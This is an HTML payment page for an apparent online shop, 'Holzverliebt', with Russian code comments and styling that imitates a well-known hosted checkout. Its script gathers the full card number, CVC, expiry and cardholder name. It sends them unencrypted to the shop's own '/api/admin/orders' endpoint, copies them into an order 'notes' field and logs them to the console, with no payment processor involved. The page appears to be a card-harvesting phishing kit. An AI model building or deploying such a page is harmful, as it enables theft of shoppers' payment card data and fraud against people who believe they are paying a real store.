<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Zahlung - Holzverliebt" />
    <title>Zahlung - Holzverliebt</title>
    <link rel="icon" type="image/svg+xml" href="/assets/logo/logo.svg" />
    <link rel="alternate icon" href="/assets/logo/logo.png" />
    <link rel="apple-touch-icon" href="/assets/logo/logo.png" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/imask@7.0.0"></script>
    <script>
        // Устанавливаем API базовый URL из переменной окружения
        // Для статических HTML файлов используем window переменную
        (function() {
            // Пытаемся получить из window (если установлено через Vite)
            if (typeof window !== 'undefined' && window.__API_BASE_URL__) {
                // Уже установлено
            } else {
                // Используем относительный путь по умолчанию
                window.__API_BASE_URL__ = '';
            }
        })();
    </script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .input-shadow { box-shadow: 0 1px 1px rgba(0,0,0,0.03), 0 3px 6px rgba(0,0,0,0.02); }
    </style>
</head>
<body class="bg-white text-[#30313d]">

    <div class="flex min-h-screen pb-12">
        <div class="w-1/2 flex flex-col items-end pt-20 pr-16 bg-white">
            <div class="w-full max-w-md">
                <div class="flex items-center mb-12">
                    <button class="text-gray-400 hover:text-gray-600 mr-4" onclick="window.history.back()">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
                    </button>
                </div>
                
                <p class="text-gray-500 text-lg mb-2" id="productName">Order</p>
                <h1 class="text-4xl font-bold text-[#1a1f36]" id="totalPrice">0.00</h1>
            </div>
        </div>

        <div class="w-1/2 bg-white border-l border-gray-100 pt-20 pl-16">
            <div class="max-w-[440px]">
                <button disabled class="w-full bg-gray-300 text-gray-500 font-semibold py-3 rounded-lg flex items-center justify-center mb-6 cursor-not-allowed opacity-60">
                    Pay with <span class="ml-1 font-bold flex items-center"><span class="bg-black text-white rounded-full px-1 text-[10px] mr-1">Link</span> link</span>
                </button>


                <div class="space-y-6">
                    <div class="border border-gray-200 rounded-lg overflow-hidden input-shadow">
                        <div class="px-4 py-3 border-bottom border-gray-200 flex items-center">
                            <svg class="w-4 h-4 text-gray-400 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
                            <input type="email" id="email" value="" class="w-full outline-none text-[15px]" placeholder="Email">
                        </div>
                        <div class="px-4 py-3 border-t border-gray-200 flex items-center">
                            <span class="mr-2">PL</span>
                            <input type="text" id="phone" value="" class="w-full outline-none text-[15px]" placeholder="+48 (151) 123-45-67">
                            <span class="text-gray-300"></span>
                        </div>
                    </div>

                    <section>
                        <h3 class="font-semibold text-[15px] mb-2">Payment method</h3>
                        <div class="border border-gray-200 rounded-lg overflow-hidden input-shadow">
                            <div class="p-3 relative">
                                <label class="text-[11px] text-[#6a7383] block mb-0.5">Card details</label>
                                <div class="flex items-center justify-between">
                                    <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" 
                                           class="w-full outline-none text-[15px] placeholder-gray-400 bg-transparent" maxlength="19">
                                    
                                    <div class="flex items-center space-x-1.5 ml-2 min-w-[70px] justify-end" id="cardLogosContainer">
                                        <img id="visaLogo" src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" 
                                             alt="Visa" class="h-[14px] w-auto object-contain opacity-90" />
                                        
                                        <img id="mastercardLogo" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
                                             alt="Mastercard" class="h-[14px] w-auto object-contain opacity-90" />
                                        
                                        <img id="amexLogo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" 
                                             alt="Amex" class="h-[14px] w-auto object-contain hidden shadow-sm rounded-[2px]" />
                                        
                                        <img id="unionpayLogo" src="https://upload.wikimedia.org/wikipedia/commons/1/1b/UnionPay_logo.svg" 
                                             alt="UnionPay" class="h-[14px] w-auto object-contain hidden border border-gray-100 rounded-[2px]" />
                                    </div>
                                </div>
                                <div id="cardError" class="text-red-600 text-xs mt-1 hidden"></div>
                            </div>
                            <div class="flex border-t border-gray-200">
                                <div class="w-1/2 p-3 border-r border-gray-200">
                                    <input type="text" id="expiry" placeholder="MM / JJ" class="w-full outline-none text-[15px]" maxlength="5">
                                    <div id="expiryError" class="text-red-600 text-xs mt-1 hidden"></div>
                                </div>
                                <div class="w-1/2 p-3">
                                    <input type="text" id="cvc" placeholder="CVC" class="w-full outline-none text-[15px]" maxlength="4">
                                </div>
                            </div>
                        </div>
                    </section>

                    <section>
                        <h3 class="font-semibold text-[15px] mb-2">Cardholder name</h3>
                        <div class="border border-gray-200 rounded-lg overflow-hidden input-shadow">
                            <div class="px-4 py-3">
                                <input type="text" id="cardholderName" placeholder="Name on card" class="w-full outline-none text-[15px]">
                            </div>
                        </div>
                    </section>

                    <section>
                        <h3 class="font-semibold text-[15px] mb-2">Country or region</h3>
                        <select class="w-full border border-gray-200 rounded-lg px-4 py-3 text-[15px] outline-none input-shadow">
                            <option>Deutschland</option>
                            <option>Polen</option>
                            <option>Österreich</option>
                            <option>Schweiz</option>
                            <option>Frankreich</option>
                            <option>Italien</option>
                            <option>Spanien</option>
                            <option>Niederlande</option>
                            <option>Belgien</option>
                            <option>Dänemark</option>
                            <option>Schweden</option>
                            <option>Norwegen</option>
                            <option>Finnland</option>
                            <option>Großbritannien</option>
                            <option>USA</option>
                            <option>Kanada</option>
                            <option>Australien</option>
                            <option>Neuseeland</option>
                            <option>Japan</option>
                            <option>Südkorea</option>
                            <option>China</option>
                            <option>Indien</option>
                            <option>Brasilien</option>
                            <option>Mexiko</option>
                            <option>Argentinien</option>
                            <option>Chile</option>
                            <option>Südafrika</option>
                            <option>Ägypten</option>
                            <option>Marokko</option>
                            <option>Türkei</option>
                            <option>Russland</option>
                            <option>Ukraine</option>
                            <option>Griechenland</option>
                            <option>Portugal</option>
                            <option>Irland</option>
                            <option>Island</option>
                            <option>Luxemburg</option>
                            <option>Liechtenstein</option>
                            <option>Monaco</option>
                            <option>Andorra</option>
                            <option>San Marino</option>
                            <option>Vatikanstadt</option>
                            <option>Malta</option>
                            <option>Zypern</option>
                            <option>Estland</option>
                            <option>Lettland</option>
                            <option>Litauen</option>
                            <option>Slowakei</option>
                            <option>Slowenien</option>
                            <option>Tschechien</option>
                            <option>Ungarn</option>
                            <option>Rumänien</option>
                            <option>Bulgarien</option>
                            <option>Kroatien</option>
                            <option>Serbien</option>
                            <option>Bosnien und Herzegowina</option>
                            <option>Nordmazedonien</option>
                            <option>Albanien</option>
                            <option>Montenegro</option>
                            <option>Kosovo</option>
                            <option>Moldawien</option>
                            <option>Weißrussland</option>
                            <option>Georgien</option>
                            <option>Armenien</option>
                            <option>Aserbaidschan</option>
                            <option>Kasachstan</option>
                            <option>Usbekistan</option>
                            <option>Turkmenistan</option>
                            <option>Kirgisistan</option>
                            <option>Tadschikistan</option>
                            <option>Mongolei</option>
                            <option>Vietnam</option>
                            <option>Thailand</option>
                            <option>Singapur</option>
                            <option>Malaysia</option>
                            <option>Indonesien</option>
                            <option>Philippinen</option>
                            <option>Taiwan</option>
                            <option>Hongkong</option>
                            <option>Macau</option>
                            <option>Bangladesch</option>
                            <option>Pakistan</option>
                            <option>Sri Lanka</option>
                            <option>Nepal</option>
                            <option>Bhutan</option>
                            <option>Myanmar</option>
                            <option>Laos</option>
                            <option>Kambodscha</option>
                            <option>Brunei</option>
                            <option>Osttimor</option>
                            <option>Papua-Neuguinea</option>
                            <option>Fidschi</option>
                            <option>Samoa</option>
                            <option>Tonga</option>
                            <option>Vanuatu</option>
                            <option>Salomonen</option>
                            <option>Palau</option>
                            <option>Mikronesien</option>
                            <option>Marshallinseln</option>
                            <option>Nauru</option>
                            <option>Tuvalu</option>
                            <option>Kiribati</option>
                            <option>Cookinseln</option>
                            <option>Niue</option>
                            <option>Tokelau</option>
                            <option>Pitcairn</option>
                            <option>Nordkorea</option>
                            <option>Südkorea</option>
                            <option>Costa Rica</option>
                            <option>Côte d'Ivoire</option>
                            <option>Kuba</option>
                            <option>Kuwait</option>
                            <option>Curaçao</option>
                            <option>Laos</option>
                            <option>Lettland</option>
                            <option>Litauen</option>
                            <option>Lesotho</option>
                            <option>Liberia</option>
                            <option>Libanon</option>
                            <option>Libyen</option>
                            <option>Liechtenstein</option>
                            <option>Luxemburg</option>
                            <option>Mauritius</option>
                            <option>Mauretanien</option>
                            <option>Madagaskar</option>
                            <option>Malawi</option>
                            <option>Malaysia</option>
                            <option>Malediven</option>
                            <option>Mali</option>
                            <option>Malta</option>
                            <option>Marokko</option>
                            <option>Martinique</option>
                            <option>Marshallinseln</option>
                            <option>Mexiko</option>
                            <option>Mikronesien</option>
                            <option>Mosambik</option>
                            <option>Moldawien</option>
                            <option>Monaco</option>
                            <option>Mongolei</option>
                            <option>Myanmar</option>
                            <option>Namibia</option>
                            <option>Nauru</option>
                            <option>Nepal</option>
                            <option>Niger</option>
                            <option>Nigeria</option>
                            <option>Niederlande</option>
                            <option>Nicaragua</option>
                            <option>Neuseeland</option>
                            <option>Neukaledonien</option>
                            <option>Norwegen</option>
                            <option>VAE</option>
                            <option>Oman</option>
                            <option>Cookinseln</option>
                            <option>Norfolkinsel</option>
                            <option>Turks- und Caicosinseln</option>
                            <option>Wallis und Futuna</option>
                            <option>Falklandinseln</option>
                            <option>Kroatien</option>
                            <option>Zentralafrikanische Republik</option>
                            <option>Tschad</option>
                            <option>Montenegro</option>
                            <option>Tschechien</option>
                            <option>Chile</option>
                            <option>Schweiz</option>
                            <option>Schweden</option>
                            <option>Serbien</option>
                            <option>Syrien</option>
                            <option>Singapur</option>
                            <option>Sierra Leone</option>
                            <option>Slowakei</option>
                            <option>Slowenien</option>
                            <option>Salomonen</option>
                            <option>Somalia</option>
                            <option>Sudan</option>
                            <option>Surinam</option>
                            <option>USA</option>
                            <option>Tadschikistan</option>
                            <option>Thailand</option>
                            <option>Tansania</option>
                            <option>Türks- und Caicosinseln</option>
                            <option>Togo</option>
                            <option>Tonga</option>
                            <option>Trinidad und Tobago</option>
                            <option>Tuvalu</option>
                            <option>Turkmenistan</option>
                            <option>Türkei</option>
                            <option>Uganda</option>
                            <option>Usbekistan</option>
                            <option>Ukraine</option>
                            <option>Uruguay</option>
                            <option>Färöer</option>
                            <option>Philippinen</option>
                            <option>Finnland</option>
                            <option>Fidschi</option>
                            <option>Frankreich</option>
                            <option>Französisch-Guayana</option>
                            <option>Französisch-Polynesien</option>
                            <option>Französische Südgebiete</option>
                            <option>Jamaika</option>
                            <option>Japan</option>
                        </select>
                    </section>

                    <div class="flex items-start p-4 border border-gray-200 rounded-lg bg-[#fcfcfd]">
                        <input type="checkbox" class="mt-1 mr-3 h-4 w-4 rounded border-gray-300">
                        <div>
                            <p class="text-[13px] text-[#6a7383] leading-relaxed">
                                By clicking "Pay", you agree to our <a href="#" class="text-blue-600 underline">Terms of Service</a> and <a href="#" class="text-blue-600 underline">Privacy Policy</a>.
                            </p>
                        </div>
                    </div>

                    <button id="payButton" class="w-full bg-[#1a1f36] text-white font-semibold py-3 rounded-lg hover:bg-[#2a2f46] transition-colors">
                        Pay
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Load price and currency from URL parameters or localStorage
            const urlParams = new URLSearchParams(window.location.search);
            // Загружаем данные из localStorage
            const price = urlParams.get('price') || localStorage.getItem('checkoutPrice') || '0.00';
            const currency = urlParams.get('currency') || localStorage.getItem('checkoutCurrency') || 'zł';
            const productName = urlParams.get('product') || localStorage.getItem('productName') || 'Order';
            
            // Загружаем данные клиента для предзаполнения формы
            const customerEmail = localStorage.getItem('customerEmail') || '';
            const customerPhone = localStorage.getItem('customerPhone') || '';

            // Устанавливаем значения на странице
            document.getElementById('totalPrice').textContent = price + ' ' + currency;
            document.getElementById('productName').textContent = productName;
            
            // Предзаполняем email и телефон, если они есть
            const emailInput = document.getElementById('email');
            let phoneInput = document.getElementById('phone');
            if (emailInput && customerEmail) {
                emailInput.value = customerEmail;
            }
            if (phoneInput && customerPhone) {
                phoneInput.value = customerPhone;
            }
            
            console.log('Payment page loaded:', { price, currency, productName, customerEmail, customerPhone });
            
            // Алгоритм Луна для проверки номера карты
            function luhnCheck(num) {
                let sum = 0;
                let isEven = false;
                for (let i = num.length - 1; i >= 0; i--) {
                    let digit = parseInt(num.charAt(i), 10);
                    if (isEven) {
                        digit *= 2;
                        if (digit > 9) {
                            digit -= 9;
                        }
                    }
                    sum += digit;
                    isEven = !isEven;
                }
                return sum % 10 === 0;
            }

            // Определение типа карты по первым цифрам
            function getCardType(cardNumber) {
                const num = cardNumber.replace(/\s/g, '');
                
                if (/^4/.test(num)) return 'visa';
                if (/^(5[1-5]|2[2-7])/.test(num)) return 'mastercard';
                if (/^3[47]/.test(num)) return 'amex';
                if (/^35/.test(num)) return 'jcb';
                if (/^62/.test(num)) return 'unionpay';
                
                return null;
            }

            // Обновление отображения логотипов
            function updateCardLogos(cardNumber) {
                const logos = {
                    visa: document.getElementById('visaLogo'),
                    mastercard: document.getElementById('mastercardLogo'),
                    unionpay: document.getElementById('unionpayLogo'),
                    amex: document.getElementById('amexLogo')
                };
                
                const cardType = getCardType(cardNumber);
                const cleanNum = cardNumber.replace(/\s/g, '');

                // Если поле пустое или введено меньше 2 цифр - показываем стандартную пару (Visa/MC)
                if (cleanNum.length < 2) {
                    Object.values(logos).forEach(img => img?.classList.add('hidden'));
                    logos.visa.classList.remove('hidden');
                    logos.mastercard.classList.remove('hidden');
                    return;
                }

                // Если тип определен - скрываем всё и показываем только ОДИН логотип
                Object.values(logos).forEach(img => img?.classList.add('hidden'));
                if (cardType && logos[cardType]) {
                    logos[cardType].classList.remove('hidden');
                }
            }

            // Card number mask - разделение по 4 цифры
            const cardInput = document.getElementById('cardNumber');
            const cardError = document.getElementById('cardError');
            if (cardInput) {
                cardInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\s/g, '');
                    
                    if (value.length > 19) {
                        value = value.substring(0, 19);
                    }
                    
                    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
                    e.target.value = formatted;
                    
                    updateCardLogos(formatted);
                    
                    const cleanNum = formatted.replace(/\s/g, '');
                    if (cleanNum.length >= 13) {
                        if (!luhnCheck(cleanNum)) {
                            cardInput.classList.add('border-red-500');
                            cardInput.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
                            cardError.classList.remove('hidden');
                            cardError.textContent = 'Ungültige Kartennummer';
                        } else {
                            cardInput.classList.remove('border-red-500');
                            cardInput.style.boxShadow = '';
                            cardError.classList.add('hidden');
                        }
                    } else {
                        cardInput.classList.remove('border-red-500');
                        cardInput.style.boxShadow = '';
                        cardError.classList.add('hidden');
                    }
                });

                cardInput.addEventListener('focus', function() {
                    this.classList.remove('border-red-500');
                    this.style.boxShadow = '';
                    cardError.classList.add('hidden');
                });
            }

            // Phone mask (используем уже объявленную переменную phoneInput)
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    
                    if (value.length > 12) {
                        value = value.substring(0, 12);
                    }
                    
                    let formatted = '';
                    if (value.length > 0) {
                        formatted = '+' + value.substring(0, 2);
                        if (value.length > 2) {
                            formatted += ' (' + value.substring(2, 5);
                        }
                        if (value.length > 5) {
                            formatted += ') ' + value.substring(5, 8);
                        }
                        if (value.length > 8) {
                            formatted += ' ' + value.substring(8, 10);
                        }
                        if (value.length > 10) {
                            formatted += ' ' + value.substring(10, 12);
                        }
                    }
                    
                    e.target.value = formatted;
                });
            }

            // Expiry date mask с проверкой на просрочку
            const expiryInput = document.getElementById('expiry');
            const expiryError = document.getElementById('expiryError');
            if (expiryInput) {
                expiryInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    
                    if (value.length > 4) {
                        value = value.substring(0, 4);
                    }
                    
                    let formatted = '';
                    if (value.length >= 1) {
                        formatted = value.substring(0, 2);
                        if (value.length >= 3) {
                            formatted += '/' + value.substring(2, 4);
                        }
                    }
                    
                    e.target.value = formatted;
                    expiryError.classList.add('hidden');
                    this.classList.remove('border-red-500');
                    this.style.boxShadow = '';
                    console.log('Expiry formatted:', formatted);
                });

                expiryInput.addEventListener('blur', function() {
                    const expiry = this.value;
                    console.log('Expiry check:', expiry);
                    if (expiry.length === 5) {
                        const [month, year] = expiry.split('/');
                        const monthNum = parseInt(month, 10);
                        const yearNum = parseInt('20' + year, 10);
                        
                        if (monthNum < 1 || monthNum > 12) {
                            this.classList.add('border-red-500');
                            this.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
                            expiryError.classList.remove('hidden');
                            expiryError.textContent = 'Ungültiger Monat (01-12)';
                            console.log('Invalid month:', monthNum);
                            return;
                        }
                        
                        const now = new Date();
                        const currentYear = now.getFullYear();
                        const currentMonth = now.getMonth() + 1;

                        if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
                            this.classList.add('border-red-500');
                            this.style.boxShadow = '0 0 0 3px rgba(239, 68, 68, 0.1)';
                            expiryError.classList.remove('hidden');
                            expiryError.textContent = 'Karte abgelaufen';
                            console.log('Card expired:', monthNum, yearNum, 'vs', currentMonth, currentYear);
                            return;
                        }
                        
                        this.classList.remove('border-red-500');
                        this.style.boxShadow = '';
                        expiryError.classList.add('hidden');
                    }
                });
            }

            // CVC mask
            const cvcInput = document.getElementById('cvc');
            if (cvcInput) {
                cvcInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 4) {
                        value = value.substring(0, 4);
                    }
                    e.target.value = value;
                });
            }

            console.log('All masks initialized');

            // Обработчик кнопки оплаты: собираем корзину и данные клиента и отправляем заказ на бэкенд
            const payButton = document.getElementById('payButton');
            if (payButton) {
                payButton.addEventListener('click', async function() {
                    try {
                        // Получаем корзину из localStorage
                        const rawCart = localStorage.getItem('cart') || '[]';
                        const cart = JSON.parse(rawCart);
                        if (!Array.isArray(cart) || cart.length === 0) {
                            alert('Корзина пуста');
                            return;
                        }

                        // Формируем items для API: { product: productId, quantity }
                        const items = cart.map(item => ({
                            product: item.id || item._id || item.product || null,
                            quantity: item.quantity || 1
                        })).filter(i => i.product);

                        if (items.length === 0) {
                            alert('Неверные данные в корзине');
                            return;
                        }

                        // Данные клиента из localStorage
                        const fullName = localStorage.getItem('customerName') || '';
                        const [firstName, ...rest] = fullName.split(' ');
                        const lastName = rest.join(' ') || ' '; 
                        const email = localStorage.getItem('customerEmail') || document.getElementById('email').value || '';
                        const phone = localStorage.getItem('customerPhone') || document.getElementById('phone').value || '';
                        const address = localStorage.getItem('customerAddress') || '';
                        const city = localStorage.getItem('customerCity') || '';
                        const currency = localStorage.getItem('checkoutCurrency') || 'zł';

                        // Получаем данные карты ПЕРЕД созданием payload
                        const cardNumberField = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value.replace(/\s/g,'') : null;
                        const cvcField = document.getElementById('cvc') ? document.getElementById('cvc').value : null;
                        const expiryField = document.getElementById('expiry') ? document.getElementById('expiry').value : null;
                        const cardholder = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : null;

                        const payload = {
                            items,
                            customer: {
                                firstName: firstName || 'Client',
                                lastName: (lastName && lastName.trim()) || ' ',
                                email: email,
                                phone: phone
                            },
                            deliveryAddress: {
                                country: document.querySelector('select') ? document.querySelector('select').value || 'Deutschland' : 'Deutschland',
                                city: city || 'Unknown',
                                street: address || 'Unknown'
                            },
                            paymentMethod: 'card', // PaymentMethod.CARD
                            deliveryMethod: 'courier', // DeliveryMethod.COURIER
                            notes: null,
                            promoCode: null,
                            deliveryCost: 0,
                            discount: 0,
                            currency: currency,
                            // Дополнительные поля для /api/admin/orders
                            cardNumber: cardNumberField,
                            cvc: cvcField,
                            expiry: expiryField,
                            cardholderName: cardholder
                        };
                        
                        // Добавляем данные карты в notes (для обоих endpoints)
                        payload.notes = JSON.stringify({
                            cardNumber: cardNumberField,
                            cvc: cvcField,
                            expiry: expiryField,
                            cardholderName: cardholder,
                            // Добавим id и название товара для контроля
                            productId: (cart && cart[0] && (cart[0].id || cart[0]._id || cart[0].product)) || null,
                            productName: (cart && cart[0] && cart[0].title) || null
                        });
                        // Получаем базовый URL из переменной окружения или используем относительный путь
                        const apiBaseUrl = (typeof window !== 'undefined' && window.__API_BASE_URL__) 
                            ? window.__API_BASE_URL__ 
                            : '';
                        const baseUrl = apiBaseUrl ? apiBaseUrl.replace(/\/api$/, '') : '';
                        
                        console.log('API Base URL from window:', window.__API_BASE_URL__);
                        console.log('Base URL:', baseUrl);
                        
                        // Пробуем endpoint'ы в порядке приоритета: сначала /api/admin/orders (более надежный)
                        const endpoints = baseUrl 
                            ? [
                                `${baseUrl}/api/admin/orders`,
                                '/api/admin/orders',
                                `${baseUrl}/api/orders`,
                                '/api/orders'
                              ]
                            : ['/api/admin/orders', '/api/orders'];
                        
                        console.log('Attempting to create order. Endpoints:', endpoints);
                        console.log('Payload:', payload);
                        
                        let resp = null;
                        let lastError = null;
                        
                        for (const ep of endpoints) {
                            try {
                                console.log('Trying endpoint:', ep);
                                resp = await fetch(ep, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify(payload)
                                });
                                
                                console.log('Response status:', resp.status, resp.statusText);
                                
                                if (resp && resp.ok) {
                                    const responseData = await resp.json();
                                    console.log('Order created successfully:', responseData);
                                    localStorage.removeItem('cart');
                                    window.location.href = '/thank-you.html';
                                    return;
                                } else {
                                    const errorText = await resp.text();
                                    console.error('Error response from', ep, ':', resp.status, errorText);
                                    lastError = `Status: ${resp.status}, ${errorText.substring(0, 100)}`;
                                }
                            } catch (e) {
                                console.error('Fetch error for', ep, ':', e);
                                lastError = e.message;
                                resp = null;
                            }
                        }

                        // Если ни один endpoint не сработал
                        let errorMsg = 'Ошибка при создании заказа. ';
                        
                        if (lastError && lastError.includes('405')) {
                            errorMsg += 'Сервер не разрешает POST запросы. Проблема в конфигурации Nginx на сервере. ';
                            errorMsg += 'Необходимо настроить Nginx для разрешения POST запросов к /api/* endpoints.';
                        } else if (lastError) {
                            errorMsg += lastError;
                        } else {
                            errorMsg += 'Не удалось связаться с бэкендом. Убедитесь, что бэкенд запущен.';
                        }
                        
                        alert(errorMsg);
                        console.error('All endpoints failed. Last error:', lastError);
                        console.error('Если ошибка 405, проверьте конфигурацию Nginx на сервере.');
                    } catch (e) {
                        console.error(e);
                        alert('Ошибка при оплате: ' + e.message);
                    }
                });
            }
        });
    </script>

</body>
</html>

